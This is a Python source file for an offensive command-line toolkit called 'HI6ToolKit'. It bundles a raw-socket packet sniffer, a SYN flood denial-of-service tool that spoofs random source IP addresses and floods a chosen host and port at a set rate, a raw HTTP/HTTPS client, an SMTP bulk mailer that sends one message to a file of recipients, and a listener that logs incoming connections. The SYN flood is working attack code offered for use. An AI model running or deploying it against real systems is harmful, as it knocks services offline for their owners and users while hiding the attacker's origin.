import socket
import multiprocessing
import struct
import base64
import binascii
import argparse
import time
import random
import sys, os
import ssl

ART = f"""


                        :::!~!!!!!:.
                .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:
            :!!!!!!?H! :!$!3hl0 w0rld!X:
            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
            !:~~~ .:!M"T#$$$$WX??#MRRMMM!
            ~?WuxiW*`   `"#$$$$8!!!!??!!!
            :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
        :!`.-   ~T$$$$8xx.  .xWW- ~""##*".
.....   -~~:<` !    ~?T#$$@@W@*?$$      /
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~  : : ?$$$B$Wu("**$RM!
$R@i.~~ !  :  :   ~$$$$$B$$en:``
?MXT@Wx.~-~-~:      "##*$$$$M~


 _    _  _____    __  _______              _  _  __ _  _   
| |  | ||_   _|  / / |__   __|            | || |/ /(_)| |  
| |__| |  | |   / /_    | |    __    ___  | || ' /  _ | |_ 
|  __  |  | |  |  _ \   | |  / _ \  / _ \ | ||  <  | || __|
| |  | | _| |_ | (_) |  | | | (_) || (_) || || . \ | || |_ 
|_|  |_||_____| \___/   |_|  \___/  \___/ |_||_|\_\|_| \__|


█ [System] : [{sys.platform.upper()}, {time.ctime()}]
█ [Hostname] : [{socket.getfqdn()}]
█ [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}]

█ [GitHub] : [github.com/HI6Cypher]
█ [Email] : [huaweisclu31@hotmail.com]


"""


class Sniff :
    def __init__(self, host : str, proto : int) :
        self.host = host
        self.proto = proto
        self.ioctl = True if "win" in sys.platform.lower() else False
        self.__content = str()
        self.__raw_buffer = bytes()
        self.TIME = time.time()

    def ip_header(self, raw_payload : bytes) :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload)
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tln = payload[2]
        idn = payload[3]
        flg = payload[4] >> 13
        oft = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {socket.IPPROTO_ICMP : "ICMP", 
                socket.IPPROTO_TCP : "TCP", 
                socket.IPPROTO_UDP : "UDP"}
        prt = protos[payload[6]] if payload[6] in protos.keys() else payload[6]
        csm = hex(payload[7])
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dst = socket.inet_ntop(socket.AF_INET, payload[9])
        return ver, ihl, tos, tln, idn, flg, \
            oft, ttl, prt, csm, src, dst

    def icmp_header(self, raw_payload : bytes) :
        payload = struct.unpack("!BBHHH", raw_payload[:8])
        typ = payload[0]
        cod = payload[1]
        csm = hex(payload[2])
        idn = payload[3]
        seq = payload[4]
        data = raw_payload[8:]
        return typ, cod, csm, idn, seq, data

    def tcp_header(self, raw_payload : bytes) :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        src = payload[0]
        dst = payload[1]
        seq = payload[2]
        acn = payload[3]
        oft = (payload[4] >> 4) * 4
        flg = payload[5]
        urg = (flg & 32) >> 5
        ack = (flg & 16) >> 4
        psh = (flg & 8) >> 3
        rst = (flg & 4) >> 2
        syn = (flg & 2) >> 1
        fin = flg & 0x1
        flg = (urg, ack, psh, rst, syn, fin)
        win = payload[6]
        csm = hex(payload[7])
        urg = payload[8]
        data = raw_payload[oft:]
        return src, dst, seq, acn, oft, flg, \
            win, csm, urg, data

    def udp_header(self, raw_payload : bytes) :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        src = payload[0]
        dst = payload[1]
        tln = payload[2]
        csm = hex(payload[3])
        data = raw_payload[8:]
        return src, dst, tln, csm, data

    def __proto(self) :
        if "win" in sys.platform.lower() and self.proto == socket.IPPROTO_TCP :
            raise OSError("Can't use socket.IPPROTO_TCP on Winsock")
        return self.proto

    def writedata(self, data : bytes) :
        counter = 1
        data = str(data).split("\\")
        text = "\t\t\t"
        for i in data :
            if counter % 10 != 0 :
                text += f"{i}\\"
            else :
                text += f"{i}\n\t\t\t\\"
            counter += 1
        text += "\n\n\n"
        return text

    def __analysis_proto(self, iph : tuple, counter : int) :
        t = "\n\t\t"
        self.__content += f"\n[*][{counter}][Connection]{time.time():_^33}\n\n"
        text = f"\tIPv4 Packet :{t}Version : {iph[0]}  Header Length : {iph[1]}  Time of Service : {iph[2]}"
        text += f"{t}Total Length : {iph[3]}  Identification : {iph[4]}  Flags : {iph[5]}"
        text += f"{t}Fragment Offset : {iph[6]}  TTL : {iph[7]}  Protocol : {iph[8]}"
        text += f"{t}Checksum : {iph[9]}  Source : {iph[10]}  Destination : {iph[11]}"
        self.__content += text + "\n\n"

        if iph[8] == "ICMP" :
            typ, cod, csm, idn, seq, data = self.icmp_header(self.__raw_buffer[iph[1]:])
            text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.writedata(data)}"
            self.__content += text + "\n"

        elif iph[8] == "TCP" :
            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(self.__raw_buffer[iph[1]:])
            text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
            self.__content += text + "\t"
            text = f"URG:{flg[0]}  ACK:{flg[1]}  PSH:{flg[2]}{t}\tRST:{flg[3]}  SYN:{flg[4]}  FIN:{flg[5]}"
            self.__content += text + t
            text = f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.writedata(data)}"
            self.__content += text

        elif iph[8] == "UDP" :
            src, dst, tln, csm, data = self.udp_header(self.__raw_buffer[iph[1]:])
            text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.writedata(data)}"
            self.__content += text + "\n"
        return None

    def __save(self) :
        path = f"data{self.TIME}.txt"
        mode = "a" if os.path.exists(path) else "x"
        with open(path, mode) as file :
            file.write(self.__content)
        return None

    def sniff(self) :
        try :
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
                sniff.bind((self.host, 0))
                sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) if self.ioctl else None
                print(ART)
                counter = 1
                try :
                    while True :
                        self.__content = str()
                        self.__raw_buffer = sniff.recvfrom(65535)[0]
                        iph = self.ip_header(self.__raw_buffer[0:20])
                        self.__analysis_proto(iph, counter)
                        self.__content = self.__content.expandtabs(4)
                        print(self.__content)
                        self.__save()
                        counter += 1
                except KeyboardInterrupt :
                    sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) if self.ioctl else None
                    sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
        return None


class DoS_SYN :
    def __init__(self, host: str, port : int, rate : int) :
        self.host = socket.gethostbyname(host)
        self.port = int(port) if not isinstance(port, int) else port
        self.rate = int(rate) if not isinstance(rate, int) else rate
        self.socket_protocol = socket.IPPROTO_TCP if "win" not in sys.platform.lower() else socket.IPPROTO_IP
        self.SYMBOL = chr(9608)

    def ip_header(self, ver : int = 4, ihl : int = 5, tos : int = 0, tln : int = 40, 
                idn : int = 0, flg : int = 0, oft : int = 0, ttl : int = 255, 
                prt : int = socket.IPPROTO_TCP, csm : int = 0, src : str = str(), dst : str = str()) :
        ihl_ver = (ver << 4) + ihl
        flg_oft = (flg << 13) + oft
        packet = struct.pack("BBHHHBBH4s4s", ihl_ver, tos, tln, idn, 
                        flg_oft, ttl, prt, csm, src, dst)
        return packet

    def tcp_header(self, srp : int = 1337, dsp : int = 0, seq : int = 0, acn : int = 0, 
                oft : int = 5, urg : int = 0, ack : int = 0, psh : int = 0, rst : int = 0, 
                syn : int = 0, fin : int = 0, win : int = 35000, csm : int = 0, urp : int = 0) :
        oft <<=  4
        flg = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        packet = struct.pack("HHLLBBHHH", srp, dsp, seq, acn, oft, 
                        flg, win, csm, urp)
        return packet

    def pseudo_header(self, src : str = str(), dst : str = str(), res : int = 0, 
                    prt : int = socket.IPPROTO_TCP, tcp : int = 0) :
        packet = struct.pack("4s4sBBH", src, dst, res, prt, tcp)
        return packet
        
    def checksum(self, data : bytes):
        checksum = 0
        for i in range(0, len(data), 2) :
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = (~ checksum) & 0xffff
        return checksum

    def random_ip(self) :
        secs = [str(random.randint(9, 255)) for _ in range(0, 4)]
        return ".".join(secs)

    def prepare(self) :
        randip = self.random_ip()
        src = socket.inet_pton(socket.AF_INET, randip)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        ip_header = self.ip_header(src = src, dst = dst, idn = random.randint(0, 65535))
        ip_header = self.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, idn = random.randint(0, 65535), csm = ip_header)
        tcp_header = self.tcp_header(dsp = self.port, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, tcp = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.tcp_header(dsp = self.port, syn = 1, csm = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self, module : bool = False) :
        try :
            if not module :
                print(ART)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        else :
            task = multiprocessing.Process(target = self.__flood())
            task.start()
        return None

    def __flood(self) :
        start_time = time.time()
        self.rate += 32
        while self.rate % 32 != 0 :
            self.rate += 1
        sec = self.rate // 32
        cons = sec
        try :
            for i in range(1, self.rate + 1) :
                payload = self.prepare()
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.socket_protocol) as flood :
                    flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    flood.sendto(payload, (self.host, self.port))
                    flood.shutdown(socket.SHUT_RDWR)
                    if i == sec :
                        print(f"[+] {(i // cons) * self.SYMBOL}  {sec} packets sent", end = "\r", flush = True)
                        sec += cons
            else :
                time.sleep(2)
                end_time = round((time.time() - start_time), 2)
                print("\n[+] All packets have sent")
                print(f"[-] {end_time}s")
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
        return None


class HTTP_Request :
    def __init__(self, host : str, port : int, end : str, decode : bool, https : bool) :
        self.host = host
        self.port = int(port) if not isinstance(port, int) else port
        self.end = end if end else "/"
        self.decode = bool(decode) if not isinstance(decode, bool) else decode
        self.https = bool(https) if not isinstance(https, bool) else https
        self.SYMBOL = chr(9608)

    def request(self, module : bool = False) :
        try :
            if not module :
                print(ART)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        else :
            task = multiprocessing.Process(target = self.__request())
            task.start()
        return None

    def __request(self) :
        try :
            sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2) if self.https is True else None
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as flood :
                flood = sslcontext.wrap_socket(flood, server_hostname = self.host) if self.https is True else flood
                payload = [
                            f"GET {self.end} HTTP/1.1", 
                            f"Host: {self.host}", 
                            "User-Agent: HI6ToolKit", 
                            "Accept: */*", 
                            "Connection: close", 
                            "\r\n"]
                payload = "\r\n".join(payload)
                print(payload)
                flood.settimeout(30)
                flood.connect((self.host, self.port))
                flood.send(payload.encode())
                raw_data = bytes()
                counter = 0
                space = str()
                while True :
                    response = flood.recv(4096)
                    if not response :
                        raw_data = raw_data.split(b"\r\n\r\n", 1)
                        header = raw_data[0]
                        data = raw_data[-1]
                        print(28 * chr(32), end = "\n")
                        print(header.decode() if isinstance(header, bytes) else header, end = "\n\n")
                        print(data.decode() if self.decode else data)
                        flood.close()
                        break
                    else :
                        if counter != 16 :
                            print(f"{counter * self.SYMBOL} Downloading", end = "\r", flush = True)
                            counter += 1
                            space += 2 * chr(32)
                        else :
                            print(space, end = "\r", flush = True)
                            counter = 0
                            space = str()
                        raw_data += response
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
        return None


class SendEmail :
    def __init__(self, smtp : str, sender : str, sender_password : str, 
                recipients : str, subject : str, text : str) :
        self.smtp = smtp
        self.sender = sender
        self.sender_password = sender_password
        self.recipients = recipients.split()
        self.subject = subject
        self.text = text

    def sendemail(self, module : bool = False) :
        try :
            if not module :
                print(ART)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        print(f"[*] setting up socket : socket.SOCK_STREAM")
        task = multiprocessing.Process(target = self.__wrap(self.smtp, self.sender, 
                                    self.sender_password,self.recipients, self.subject, self.text))
        task.start()
        return None

    def __send(self, socket : socket, payload : str) :
        socket.sendall(payload.encode())
        return None

    def __recv(self, socket : socket) :
        return socket.recv(4096).decode()

    def __ehlo(self, socket : socket, server : str) :
        ehlo_message = f"EHLO {server}\r\n"
        self.__send(socket, ehlo_message)
        return None

    def __authentication(self, socket : socket, username : str, password : str) :
        self.__send(socket, "AUTH LOGIN\r\n")
        self.__recv(socket)
        username = base64.b64encode(username.encode()).decode() + "\r\n"
        self.__send(socket, username)
        self.__recv(socket)
        print("[*] send base64 of username")
        password = base64.b64encode(password.encode()).decode() + "\r\n"
        self.__send(socket, password)
        response = self.__recv(socket).split()
        print("[*] send base64 of password")
        if response[0] == "235" :
            print(f"[+] {response[-2]} {response[-1]} ({response[0]})")
            return True
        else :
            print(f"[-] authentication failed")
            print(f"[-] check username and password then try again")
        return False

    def __mailing(self, socket : socket, sender : str, recipient : str, subject : str, text : str) :
        from_message = f"MAIL FROM: {sender}\r\n"
        self.__send(socket, from_message)
        response_fm = self.__recv(socket).split()
        if response_fm[0] == "250" :
            print(f"[+] {response_fm[-2]} {response_fm[-1]} ({response_fm[0]})")
        else :
            print(f"[-] we've got problem here ({response_fm[0]})")
        rcpt_message = f"RCPT TO: {recipient} \r\n"
        self.__send(socket, rcpt_message)
        response_rm = self.__recv(socket).split()
        if response_rm[0] == "250" :
            print(f"[+] {response_rm[-2]} {response_rm[-1]} ({response_rm[0]})")
        else :
            print(f"[-] we've got problem here ({response_rm[0]})")
        self.__send(socket, "DATA\r\n")
        subject_message = f"Subject: {subject}\r\n"
        self.__send(socket, subject_message)
        text = f"\r\n{text}\r\n.\r\n"
        self.__send(socket, text)
        self.__recv(socket)
        response_fi = self.__recv(socket).split()
        if response_fm[0] == "250" :
            print(f"[+] {response_fi[-3]} ({response_fi[0]})")
            print(f"[+] {response_fi[-2]}")
            print(f"[+] {response_fi[-1]}")
        else :
            print(f"[-] we've got problem here ({response_fi[0]})")
        return None

    def __wrap(self, smtp_server : str, sender : str, sender_password : str, 
            recipients : list, subject : str, text : str) :
        try :
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mail :
                print(f"[*] connecting to the {smtp_server}")
                mail.connect((smtp_server, 587))
                conn = mail.recv(1024)
                if conn.decode().split()[0] == str(220) :
                    print(f"[+] server {smtp_server} is ready")
                else :
                    print(f"[-] server {smtp_server} isn't ready")
                    mail.close()
                self.__ehlo(mail, smtp_server)
                self.__recv(mail)
                print(f"[*] sending ehlo to the server {smtp_server}")
                self.__send(mail, "STARTTLS\r\n")
                self.__recv(mail)
                print("[*] starting TLS connection")
                print("[*] wraping socket with TLS connection")
                ssl_conn = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                with ssl_conn.wrap_socket(sock = mail, server_hostname = smtp_server) as protomail :
                    print("[+] socket successfully wraped")
                    print(f"[*] sending ehlo to the server {smtp_server} on TLS connection")
                    self.__ehlo(protomail, smtp_server)
                    self.__recv(protomail)
                    print("[*] authenticating...")
                    auth = self.__authentication(protomail, sender, sender_password)
                    if auth :
                        for recipient in recipients :
                            print(f"[*] sending email to {recipient}")
                            self.__mailing(protomail, sender, recipient, subject, text)
                        else :
                            print(f"[*] sending QUIT to {smtp_server}")
                            self.__send(protomail, "QUIT")
                    else :
                        sys.exit(1)
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
        return None


class Listen :
    def __init__(self, host : str, port : int, timeout : int, proto : int) :
        self.host = host
        self.port = int(port) if not isinstance(port, int) else port
        self.timeout = int(timeout) if not isinstance(timeout, int) else timeout
        self.proto = proto
        self.all_data = str()
        self.TIME = time.time()

    def __save(self) :
        path = f"data{self.TIME}.txt"
        mode = "a" if os.path.exists(path) else "x"
        with open(path, mode) as file :
            file.write(self.all_data.replace("\r", str()))
        return None

    def listen(self, module : bool = False) :
        try :
            if not module :
                print(ART)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        counter = 1
        try :
            with socket.socket(socket.AF_INET, self.proto) as listen :
                listen.settimeout(self.timeout)
                listen.bind((self.host, int(self.port)))
                listen.listen(5) if self.proto == socket.SOCK_STREAM else None
                try :
                    while True :
                        conn, address = listen.accept() if self.proto == socket.SOCK_STREAM else listen.recvfrom(1024)
                        payload = conn.recv(1024) if self.proto == socket.SOCK_STREAM else conn
                        text = f"\n[{counter}][{time.time()}] connection from {address}\n"
                        print(text)
                        if payload :
                            self.all_data += text + payload.decode()
                            self.__save()
                            print(payload.decode())
                            counter += 1
                            self.all_data = str()
                except KeyboardInterrupt :
                    sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
        return None

if __name__ == "__main__" :
    info = "[GitHub] : github.com/HI6Cypher [Email] : huaweisclu31@hotmail.com"
    os.system("clear || cls")
    def manage_args() :
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", epilog = info, add_help = True)
        parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, EMAIL, LISTEN]")
        parser.add_argument("-m", "--method", type = str, help = "To specify method of tool")
        parser.add_argument("-x", "--host", type = str, help = "To specify host")
        parser.add_argument("-p", "--port", type = int, help = "To specify port")
        parser.add_argument("-e", "--endpoint", type = str, help = "To specify endpoint")
        parser.add_argument("-d", "--decode", action = "store_true", help = "To specify decode boolean")
        parser.add_argument("-r", "--rate", type = int, help = "To specify rate")
        parser.add_argument("-t", "--time", type = int, help = "To specify timeout")
        parser.add_argument("--smtp", type = str, help = "To specify SMTP server")
        parser.add_argument("--sender", type = str, help = "To specify sender email")
        parser.add_argument("--key", type = str, help = "To specify password of sender")
        parser.add_argument("--rcptpath", type = str, help = "To specify recipient file path")
        parser.add_argument("--subject", type = str, help = "To specify subject of email")
        parser.add_argument("--textpath", type = str, help = "To specify textfile of email")
        args = parser.parse_args()

        def help_message() :
            print(ART)
            parser.print_help()
            return None

        def PacketSniff_args(host : str, proto : str) :
            if proto.upper() == "ALL" :
                proto = socket.IPPROTO_IP
            elif proto.upper() == "TCP" :
                proto = socket.IPPROTO_TCP
            elif proto.upper() == "UDP" :
                proto = socket.IPPROTO_UDP
            elif proto.upper() == "ICMP" :
                proto = socket.IPPROTO_ICMP
            host = socket.gethostbyname(socket.gethostname()) if host.upper() == "DEFAULT" else host
            sniff = Sniff(host, proto)
            sniff.sniff()
            return None

        def DoS_args(host : str, port : int, rate : int) :
            flood = DoS_SYN(host, port, rate)
            flood.flood()
            return None

        def HTTP_Request_args(host : str, port : int, endpoint : str, decode : bool) :
            port = port if port else 80
            host = host if host else "127.0.0.1"
            client = HTTP_Request(host, port, endpoint, decode, https = False)
            client.request()
            return None

        def HTTPS_Request_args(host : str, port : int, endpoint : str, decode : bool) :
            port = port if port else 443
            host = host if host else "127.0.0.1"
            client = HTTP_Request(host, port, endpoint, decode, https = True)
            client.request()
            return None

        def SendEmail_args(smtp : str, sender : str, sender_password : str, 
                        recipient_path : str, subject : str, text_path : str) :
            if os.path.exists(recipient_path) :
                with open(recipient_path) as file :
                    recipients = file.read()
                with open(text_path) as file :
                    message = file.read()
                sendemail = SendEmail(smtp, sender, sender_password, recipients, subject, message)
                sendemail.sendemail()
            else :
                print(f"[!] Error - {recipient_path} not found")
            return None

        def Listen_args(host : str, port : int, timeout : int, proto : str) :
            protos = ["TCP", "UDP"]
            if proto.upper() in protos[:1] :
                proto = socket.SOCK_STREAM
            elif proto.upper() in protos[1:] :
                proto = socket.SOCK_DGRAM
            else :
                raise TypeError(f"{proto} is not in {protos}")
            listen = Listen(host, port, timeout, proto)
            listen.listen()
            return None

        if args.Tool.upper() == "ART" :
            print(ART)
        elif args.Tool.upper() == "SNIFF" :
            PacketSniff_args(args.host, args.method)
        elif args.Tool.upper() == "DOS" :
            DoS_args(args.host, args.port, args.rate)
        elif args.Tool.upper() == "HTTP" :
            HTTP_Request_args(args.host, args.port, args.endpoint, args.decode)
        elif args.Tool.upper() == "HTTPS" :
            HTTPS_Request_args(args.host, args.port, args.endpoint, args.decode)
        elif args.Tool.upper() == "EMAIL" :
            SendEmail_args(args.smtp, args.sender, args.key, args.rcptpath, args.subject, args.textpath)
        elif args.Tool.upper() == "LISTEN" :
            Listen_args(args.host, args.port, args.time, args.method)
        else :
            help_message()
        return None
    try :
        manage_args()
    except Exception as error :
        print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")